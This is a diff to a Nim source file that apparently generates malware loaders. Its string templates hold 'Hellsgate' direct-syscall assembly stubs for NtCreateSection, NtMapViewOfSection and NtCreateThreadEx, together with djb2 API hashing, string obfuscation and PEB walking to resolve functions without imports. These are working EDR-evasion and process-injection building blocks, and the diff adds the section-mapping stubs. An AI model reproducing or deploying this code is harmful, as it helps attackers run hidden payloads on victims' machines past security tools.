@@ -1,15 +1,15 @@
 
 let DInvokeGetModuleHandleADelegate* = """
 
-type
-  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
+    type
+        GetModuleHandleA_t = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
 
-const
-  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
+    const
+        GetModuleHandleA_HASH  = obf("GetModuleHandleA")
 
-var MyGetModuleHandleA*: GetModuleHandleA_t
+    var MyGetModuleHandleA: GetModuleHandleA_t
 
-MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
+    MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
 
 """
 
@@ -82,6 +82,41 @@ var
 
 """
 
+let HellsgateNtCreateSectionDelegate*  = """
+
+proc NtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntCreateSectionfuncHash        : uint64            = djb2_hash(obf("NtCreateSection"))
+    ntCreateSectionTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreateSectionfuncHash)
+
+"""
+
+let HellsgateNtMapViewOfSectionDelegate*  = """
+
+proc NtMapViewOfSection(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntMapViewOfSectionfuncHash        : uint64            = djb2_hash(obf("NtMapViewOfSection"))
+    ntMapViewOfSectionTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntMapViewOfSectionfuncHash)
+
+"""
+
+
 let HellsgateNtCreateThreadExDelegate*  = """
 
 type
@@ -141,12 +176,9 @@ let HellsgateStub*  = """
 
 when defined(Hellsgate):
 
-    from os import paramStr
-    from random import randomize,rand
-
-    randomize()
-    
-    {.passC:"-masm=intel".}
+    #from random import randomize,rand
+    # currently not in use
+    #randomize()
     
         #[
             Windows Undocumented Structures - Windows 7+
@@ -157,12 +189,12 @@ when defined(Hellsgate):
     type
         # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
         ASSEMBLY_STORAGE_MAP {.pure.} = object
-            Flags*      : ULONG
-            DosPath*    : UNICODE_STRING
-            Handle*     : HANDLE
-        PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP
+            Flags      : ULONG
+            DosPath    : UNICODE_STRING
+            Handle     : HANDLE
+        PASSEMBLY_STORAGE_MAP = ptr ASSEMBLY_STORAGE_MAP
     
-        LDR_DLL_LOAD_REASON* {.pure.} = enum
+        LDR_DLL_LOAD_REASON {.pure.} = enum
             LoadReasonUnknown                       = -1
             LoadReasonStaticDependency              = 0
             LoadReasonStaticForwarderDependency     = 1
@@ -174,203 +206,203 @@ when defined(Hellsgate):
             LoadReasonEnclavePrimary                = 7
             LoadReasonEnclaveDependency             = 8
     
-        RTL_BALANCED_NODE_STRUCT1* {.pure.} = object
-            Left* : PRTL_BALANCED_NODE
-            Right* : PRTL_BALANCED_NODE
+        RTL_BALANCED_NODE_STRUCT1 {.pure.} = object
+            Left : PRTL_BALANCED_NODE
+            Right : PRTL_BALANCED_NODE
     
-        RTL_BALANCED_NODE_UNION1* {.pure, union.} = object
-            Children* : array[2, PRTL_BALANCED_NODE]
-            Struct1*  : RTL_BALANCED_NODE_STRUCT1
+        RTL_BALANCED_NODE_UNION1 {.pure, union.} = object
+            Children : array[2, PRTL_BALANCED_NODE]
+            Struct1  : RTL_BALANCED_NODE_STRUCT1
     
-        RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
-            Red*        {.bitsize:1.}   : UCHAR
-            Balance*    {.bitsize:2.}   : UCHAR
-            ParentValue*                : ULONG_PTR
+        RTL_BALANCED_NODE_UNION2 {.pure, union.} = object
+            Red        {.bitsize:1.}   : UCHAR
+            Balance    {.bitsize:2.}   : UCHAR
+            ParentValue                : ULONG_PTR
     
-        RTL_BALANCED_NODE* {.pure.} = object
-            Union1* : RTL_BALANCED_NODE_UNION1
-            Union2* : RTL_BALANCED_NODE_UNION2
-        PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE
+        RTL_BALANCED_NODE {.pure.} = object
+            Union1 : RTL_BALANCED_NODE_UNION1
+            Union2 : RTL_BALANCED_NODE_UNION2
+        PRTL_BALANCED_NODE = ptr RTL_BALANCED_NODE
     
-        LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
-            InInitializationOrderLinks*  : LIST_ENTRY
-            InProgressLinks*             : LIST_ENTRY
-        PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE
+        LDR_DATA_TABLE_ENTRY_UNION_ONE {.pure, union.} = object
+            InInitializationOrderLinks  : LIST_ENTRY
+            InProgressLinks             : LIST_ENTRY
+        PLDR_DATA_TABLE_ENTRY_UNION_ONE = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE
     
-        LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
-            PackagedBinary* {.bitsize:1.}           : ULONG
-            MarkedForRemoval* {.bitsize:1.}         : ULONG
-            ImageDll* {.bitsize:1.}                 : ULONG
-            LoadNotificationSent* {.bitsize:1.}     : ULONG
-            TelemetryEntryProcessed* {.bitsize:1.}  : ULONG
-            ProcessStaticImport* {.bitsize:1.}      : ULONG
-            InLegacyLists* {.bitsize:1.}            : ULONG
-            InIndexes* {.bitsize:1.}                : ULONG
-            ShimDll* {.bitsize:1.}                  : ULONG
-            InExceptionTable* {.bitsize:1.}         : ULONG
-            ReservedFlags1* {.bitsize:2.}           : ULONG
-            LoadInProgress* {.bitsize:1.}           : ULONG
-            LoadConfigProcessed* {.bitsize:1.}      : ULONG
-            EntryProcessed* {.bitsize:1.}           : ULONG
-            ProtectDelayLoad* {.bitsize:1.}         : ULONG
-            ReservedFlags3* {.bitsize:2.}           : ULONG
-            DontCallForThreads* {.bitsize:1.}       : ULONG
-            ProcessAttachCalled* {.bitsize:1.}      : ULONG
-            ProcessAttachFailed* {.bitsize:1.}      : ULONG
-            CorDeferredValidate* {.bitsize:1.}      : ULONG
-            CorImage* {.bitsize:1.}                 : ULONG
+        LDR_DATA_TABLE_ENTRY_STRUCT_ONE {.pure.} = object
+            PackagedBinary {.bitsize:1.}           : ULONG
+            MarkedForRemoval {.bitsize:1.}         : ULONG
+            ImageDll {.bitsize:1.}                 : ULONG
+            LoadNotificationSent {.bitsize:1.}     : ULONG
+            TelemetryEntryProcessed {.bitsize:1.}  : ULONG
+            ProcessStaticImport {.bitsize:1.}      : ULONG
+            InLegacyLists {.bitsize:1.}            : ULONG
+            InIndexes {.bitsize:1.}                : ULONG
+            ShimDll {.bitsize:1.}                  : ULONG
+            InExceptionTable {.bitsize:1.}         : ULONG
+            ReservedFlags1 {.bitsize:2.}           : ULONG
+            LoadInProgress {.bitsize:1.}           : ULONG
+            LoadConfigProcessed {.bitsize:1.}      : ULONG
+            EntryProcessed {.bitsize:1.}           : ULONG
+            ProtectDelayLoad {.bitsize:1.}         : ULONG
+            ReservedFlags3 {.bitsize:2.}           : ULONG
+            DontCallForThreads {.bitsize:1.}       : ULONG
+            ProcessAttachCalled {.bitsize:1.}      : ULONG
+            ProcessAttachFailed {.bitsize:1.}      : ULONG
+            CorDeferredValidate {.bitsize:1.}      : ULONG
+            CorImage {.bitsize:1.}                 : ULONG
             DontRelocate {.bitsize:1.}              : ULONG
-            CorILOnly* {.bitsize:1.}                : ULONG
-            ChpeImage* {.bitsize:1.}                : ULONG
-            ReservedFlags5* {.bitsize:2.}           : ULONG
-            Redirected* {.bitsize:1.}               : ULONG
-            ReservedFlags6* {.bitsize:2.}           : ULONG
-            CompatDatabaseProcessed* {.bitsize:1.}  : ULONG
+            CorILOnly {.bitsize:1.}                : ULONG
+            ChpeImage {.bitsize:1.}                : ULONG
+            ReservedFlags5 {.bitsize:2.}           : ULONG
+            Redirected {.bitsize:1.}               : ULONG
+            ReservedFlags6 {.bitsize:2.}           : ULONG
+            CompatDatabaseProcessed {.bitsize:1.}  : ULONG
     
-        LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
-            FlagGroup*   : array[4, UCHAR]
-            Flags*       : ULONG
-            Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
-        PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
+        LDR_DATA_TABLE_ENTRY_UNION_TWO {.pure, union.} = object
+            FlagGroup   : array[4, UCHAR]
+            Flags       : ULONG
+            Struct      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
+        PLDR_DATA_TABLE_ENTRY_UNION_TWO = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
         
     
-        PEB_LDR_DATA* {.pure.} = object
-            Length*                             : ULONG
-            Initialized*                        : BOOLEAN
-            SsHandle*                           : PVOID
-            InLoadOrderModuleList*              : LIST_ENTRY
-            InMemoryOrderModuleList*            : LIST_ENTRY
-            InInitializationOrderModuleList*    : LIST_ENTRY
-            EntryInProgress*                    : PVOID
-            ShutdownInProgress*                 : BOOLEAN
-            ShutdownThreadId*                   : HANDLE
-        PPEB_LDR_DATA* = ptr PEB_LDR_DATA
+        PEB_LDR_DATA {.pure.} = object
+            Length                             : ULONG
+            Initialized                        : BOOLEAN
+            SsHandle                           : PVOID
+            InLoadOrderModuleList              : LIST_ENTRY
+            InMemoryOrderModuleList            : LIST_ENTRY
+            InInitializationOrderModuleList    : LIST_ENTRY
+            EntryInProgress                    : PVOID
+            ShutdownInProgress                 : BOOLEAN
+            ShutdownThreadId                   : HANDLE
+        PPEB_LDR_DATA = ptr PEB_LDR_DATA
     
-        PEB* {.pure.} = object
-            InheritedAddressSpace*                  : BOOLEAN
-            ReadImageFileExecOptions*               : BOOLEAN
-            BeingDebugged*                          : BOOLEAN
-            PebUnion1*                              : UCHAR
-            Padding0*                               : array[4, UCHAR]
-            Mutant*                                 : HANDLE
-            ImageBaseAddress*                       : PVOID
-            Ldr*                                    : PPEB_LDR_DATA                             
-            ProcessParameters*                      : PRTL_USER_PROCESS_PARAMETERS  
-            SubSystemData*                          : PVOID                         
-            ProcessHeap*                            : HANDLE                        
-            FastPebLock*                            : PVOID          # PRTL_CRITICAL_SECTION
-            AtlThunkSListPtr*                       : PVOID                         
-            IFEOKey*                                : PVOID                         
-            PebUnion2*                              : ULONG                         
-            Padding1*                               : array[4, UCHAR]               
-            KernelCallBackTable*                    : ptr PVOID                     
-            SystemReserved*                         : ULONG                         
-            AltThunkSListPtr32*                     : ULONG                         
-            ApiSetMap*                              : PVOID                         
-            TlsExpansionCounter*                    : ULONG                         
-            Padding2*                               : array[4, UCHAR]               
-            TlsBitmap*                              : PVOID                         
-            TlsBitmapBits*                          : array[2, ULONG]               
-            ReadOnlyShareMemoryBase*                : PVOID                         
-            SharedData*                             : PVOID                         
-            ReadOnlyStaticServerData*               : ptr PVOID                     
-            AnsiCodePageData*                       : PVOID                         
-            OemCodePageData*                        : PVOID                         
-            UnicodeCaseTableData*                   : PVOID                         
-            NumberOfProcessors*                     : ULONG                         
-            NtGlobalFlag*                           : ULONG                         
-            CriticalSectionTimeout*                 : LARGE_INTEGER                 
-            HeapSegmentReserve*                     : ULONG_PTR                     
-            HeapSegmentCommit*                      : ULONG_PTR                     
-            HeapDeCommitTotalFreeThreshold*         : ULONG_PTR                     
-            HeapDeCommitFreeBlockThreshold*         : ULONG_PTR                     
-            NumberOfHeaps*                          : ULONG                         
-            MaximumNumberOfHeaps*                   : ULONG                         
-            ProcessHeaps*                           : ptr PVOID                     
-            GdiSharedHandleTable*                   : PVOID                         
-            ProcessStarterHelper*                   : PVOID                         
-            GdiDCAttributeList*                     : ULONG                         
-            Padding3*                               : array[4, UCHAR]               
-            LoaderLock*                             : PVOID           # PRTL_CRITICAL_SECTION
-            OSMajorVersion*                         : ULONG
-            OSMinorVersion*                         : ULONG
-            OSBuildNumber*                          : USHORT
-            OSCSDVersion*                           : USHORT
-            OSPlatformId*                           : ULONG
-            ImageSubsystem*                         : ULONG
-            ImageSubsystemMajorVersion*             : ULONG
-            ImageSubsystemMinorVersion*             : ULONG
+        PEB {.pure.} = object
+            InheritedAddressSpace                  : BOOLEAN
+            ReadImageFileExecOptions               : BOOLEAN
+            BeingDebugged                          : BOOLEAN
+            PebUnion1                              : UCHAR
+            Padding0                               : array[4, UCHAR]
+            Mutant                                 : HANDLE
+            ImageBaseAddress                       : PVOID
+            Ldr                                    : PPEB_LDR_DATA                             
+            ProcessParameters                      : PRTL_USER_PROCESS_PARAMETERS  
+            SubSystemData                          : PVOID                         
+            ProcessHeap                            : HANDLE                        
+            FastPebLock                            : PVOID          # PRTL_CRITICAL_SECTION
+            AtlThunkSListPtr                       : PVOID                         
+            IFEOKey                                : PVOID                         
+            PebUnion2                              : ULONG                         
+            Padding1                               : array[4, UCHAR]               
+            KernelCallBackTable                    : ptr PVOID                     
+            SystemReserved                         : ULONG                         
+            AltThunkSListPtr32                     : ULONG                         
+            ApiSetMap                              : PVOID                         
+            TlsExpansionCounter                    : ULONG                         
+            Padding2                               : array[4, UCHAR]               
+            TlsBitmap                              : PVOID                         
+            TlsBitmapBits                          : array[2, ULONG]               
+            ReadOnlyShareMemoryBase                : PVOID                         
+            SharedData                             : PVOID                         
+            ReadOnlyStaticServerData               : ptr PVOID                     
+            AnsiCodePageData                       : PVOID                         
+            OemCodePageData                        : PVOID                         
+            UnicodeCaseTableData                   : PVOID                         
+            NumberOfProcessors                     : ULONG                         
+            NtGlobalFlag                           : ULONG                         
+            CriticalSectionTimeout                 : LARGE_INTEGER                 
+            HeapSegmentReserve                     : ULONG_PTR                     
+            HeapSegmentCommit                      : ULONG_PTR                     
+            HeapDeCommitTotalFreeThreshold         : ULONG_PTR                     
+            HeapDeCommitFreeBlockThreshold         : ULONG_PTR                     
+            NumberOfHeaps                          : ULONG                         
+            MaximumNumberOfHeaps                   : ULONG                         
+            ProcessHeaps                           : ptr PVOID                     
+            GdiSharedHandleTable                   : PVOID                         
+            ProcessStarterHelper                   : PVOID                         
+            GdiDCAttributeList                     : ULONG                         
+            Padding3                               : array[4, UCHAR]               
+            LoaderLock                             : PVOID           # PRTL_CRITICAL_SECTION
+            OSMajorVersion                         : ULONG
+            OSMinorVersion                         : ULONG
+            OSBuildNumber                          : USHORT
+            OSCSDVersion                           : USHORT
+            OSPlatformId                           : ULONG
+            ImageSubsystem                         : ULONG
+            ImageSubsystemMajorVersion             : ULONG
+            ImageSubsystemMinorVersion             : ULONG
             Padding4                                : array[4, UCHAR]
-            ActiveProcessAffinityMask*              : PVOID            # KAFFINITY
+            ActiveProcessAffinityMask              : PVOID            # KAFFINITY
             GdiHandleBuffer                         : array[0x3c, ULONG]
-            PostProcessInitRoutine*                 : VOID
-            TlsExpansionBitmap*                     : PVOID
-            TlsExpansionBitmapBits*                 : array[0x20, ULONG]
-            SessionId*                              : ULONG
-            Padding5*                               : array[4, UCHAR]
-            AppCompatFlags*                         : ULARGE_INTEGER
-            AppCompatFlagsUser*                     : ULARGE_INTEGER
-            ShimData*                               : PVOID
-            AppCompatInfo*                          : PVOID
-            CSDVersion*                             : UNICODE_STRING
-            ActivationContextData*                  : PVOID             # PACTIVATION_CONTEXT_DATA 
-            ProcessAssemblyStorageMap*              : PVOID             # PASSEMBLY_STORAGE_MAP
-            SystemDefaultActivationContextData*     : PVOID             # PACTIVATION_CONTEXT_DATA
-            SystemAssemblyStorageMap*               : PVOID             # PASSEMBLY_STORAGE_MAP
-            MinimumStackCommit*                     : ULONG_PTR
-            Sparepointers*                          : array[4, PVOID]
-            SpareUlongs*                            : array[5, ULONG]
-            WerRegistrationData*                    : PVOID
-            WerShipAssertPtr*                       : PVOID
-            Unused*                                 : PVOID
-            ImageHeaderHash*                        : PVOID
-            TracingFlags*                           : ULONG
-            CsrServerReadOnlySharedMemoryBase*      : ULONGLONG
-            TppWorkerpListLock*                     : ULONG
-            TppWorkerpList*                         : LIST_ENTRY
-            WaitOnAddressHashTable*                 : array[0x80, PVOID]
-            TelemtryCoverageHeader*                 : PVOID
-            CloudFileFlags*                         : ULONG
-            CloudFileDiagFlags*                     : ULONG
-            PlaceholderCompatabilityMode*           : CHAR
-            PlaceholderCompatabilityModeReserved*   : array[7, CHAR]
-            LeapSecondData*                         : PVOID
-            LeapSecondFlags*                        : ULONG
-            NtGlobalFlag2*                          : ULONG
-        PPEB* = ptr PEB
+            PostProcessInitRoutine                 : VOID
+            TlsExpansionBitmap                     : PVOID
+            TlsExpansionBitmapBits                 : array[0x20, ULONG]
+            SessionId                              : ULONG
+            Padding5                               : array[4, UCHAR]
+            AppCompatFlags                         : ULARGE_INTEGER
+            AppCompatFlagsUser                     : ULARGE_INTEGER
+            ShimData                               : PVOID
+            AppCompatInfo                          : PVOID
+            CSDVersion                             : UNICODE_STRING
+            ActivationContextData                  : PVOID             # PACTIVATION_CONTEXT_DATA 
+            ProcessAssemblyStorageMap              : PVOID             # PASSEMBLY_STORAGE_MAP
+            SystemDefaultActivationContextData     : PVOID             # PACTIVATION_CONTEXT_DATA
+            SystemAssemblyStorageMap               : PVOID             # PASSEMBLY_STORAGE_MAP
+            MinimumStackCommit                     : ULONG_PTR
+            Sparepointers                          : array[4, PVOID]
+            SpareUlongs                            : array[5, ULONG]
+            WerRegistrationData                    : PVOID
+            WerShipAssertPtr                       : PVOID
+            Unused                                 : PVOID
+            ImageHeaderHash                        : PVOID
+            TracingFlags                           : ULONG
+            CsrServerReadOnlySharedMemoryBase      : ULONGLONG
+            TppWorkerpListLock                     : ULONG
+            TppWorkerpList                         : LIST_ENTRY
+            WaitOnAddressHashTable                 : array[0x80, PVOID]
+            TelemtryCoverageHeader                 : PVOID
+            CloudFileFlags                         : ULONG
+            CloudFileDiagFlags                     : ULONG
+            PlaceholderCompatabilityMode           : CHAR
+            PlaceholderCompatabilityModeReserved   : array[7, CHAR]
+            LeapSecondData                         : PVOID
+            LeapSecondFlags                        : ULONG
+            NtGlobalFlag2                          : ULONG
+        PPEB = ptr PEB
     
-        TEB* {.pure.} = object
-            NtTib*                                  : NT_TIB
-            EnvironmentPointer*                     : PVOID
-            ClientId*                               : CLIENT_ID
-            ActiveRpcHandle*                        : PVOID
-            ThreadLocalStoragePointer*              : PVOID
-            ProcessEnvironmentBlock*                : PEB
-            LastErrorValue*                         : ULONG
-            CountOfOwnedCriticalSections*           : ULONG
-            CsrClientThread*                        : PVOID
-            Win32ThreadInfo*                        : PVOID
-            User32Reserved*                         : array[0x1A, ULONG]
-            UserReserved*                           : array[5, ULONG]
-            WOW32Reserved*                          : PVOID
-            CurrentLocale*                          : ULONG
-            FpSoftwareStatusRegister*               : ULONG
-            ReservedForDebuggerInstrumentation*     : array[0x10, PVOID]
-        PTEB* = ptr TEB
-    
-    
+        TEB {.pure.} = object
+            NtTib                                  : NT_TIB
+            EnvironmentPointer                     : PVOID
+            ClientId                               : CLIENT_ID
+            ActiveRpcHandle                        : PVOID
+            ThreadLocalStoragePointer              : PVOID
+            ProcessEnvironmentBlock                : PEB
+            LastErrorValue                         : ULONG
+            CountOfOwnedCriticalSections           : ULONG
+            CsrClientThread                        : PVOID
+            Win32ThreadInfo                        : PVOID
+            User32Reserved                         : array[0x1A, ULONG]
+            UserReserved                           : array[5, ULONG]
+            WOW32Reserved                          : PVOID
+            CurrentLocale                          : ULONG
+            FpSoftwareStatusRegister               : ULONG
+            ReservedForDebuggerInstrumentation     : array[0x10, PVOID]
+        PTEB = ptr TEB
     
     
     
-    var syscall*  : WORD
+    
+    
+    var syscall  : WORD
     type
-        HG_TABLE_ENTRY* = object
-            pAddress*    : PVOID
-            dwHash*      : uint64
-            wSysCall*    : WORD
-        PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY
+        HG_TABLE_ENTRY = object
+            pAddress    : PVOID
+            dwHash      : uint64
+            wSysCall    : WORD
+        PHG_TABLE_ENTRY = ptr HG_TABLE_ENTRY
     
-    proc djb2_hash*(pFuncName : cstring) : uint64 =
+    proc djb2_hash(pFuncName : cstring) : uint64 =
     
         var hash : uint64 = 0x5381
     
@@ -379,13 +411,13 @@ when defined(Hellsgate):
     
         return hash
     
-    proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
+    proc moduleToBuffer(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
         return pCurrentModule.FullDllName.Buffer
     
-    proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
+    proc flinkToModule(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
         return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)
     
-    proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =
+    proc getExportTable(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =
     
         let 
             pImageBase : PVOID              = pCurrentModule.DLLBase
@@ -402,7 +434,7 @@ when defined(Hellsgate):
     
         return true
     
-    proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =
+    proc getTableEntry(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =
     
         var 
             cx : DWORD = 0
@@ -453,7 +485,7 @@ when defined(Hellsgate):
             inc cx
         return false
     
-    proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
+    proc GetPEBAsm64(): PPEB {.asmNoStackFrame.} =
         asm ===
             mov rax, qword ptr gs:[0x60]
             ret
@@ -465,7 +497,7 @@ when defined(Hellsgate):
         when defined(verbose):
             echo obf("[*] Resolving syscall...")
         when defined(verbose):
-            echo obf("[*] NTDDL Base: ") & $cast[int](ntdllModuleBaseAddr).toHex
+            echo obf("[*] NTDLL Base: ") & $cast[int](ntdllModuleBaseAddr).toHex
         #var
         #    num = rand(75)
         #    count: int = 0
@@ -484,11 +516,11 @@ when defined(Hellsgate):
             echo obf("[!] Did not find a syscall instruction in ntdll...")
         quit(1)
 
-    proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
+    proc getNextModule(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
         flink = flink.Flink[]
         return flinkToModule(flink)
     
-    proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
+    proc searchLoadedModules(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
         var 
             currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
             currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
@@ -522,10 +554,10 @@ when defined(Hellsgate):
                 break
         return false
     
-    proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
+    proc getSyscall(tableEntry : var HG_TABLE_ENTRY) : bool =
         
         let currentPeb  : PPEB = GetPEBAsm64()
-           
+        
         if not searchLoadedModules(currentPeb, tableEntry):
             return false
     
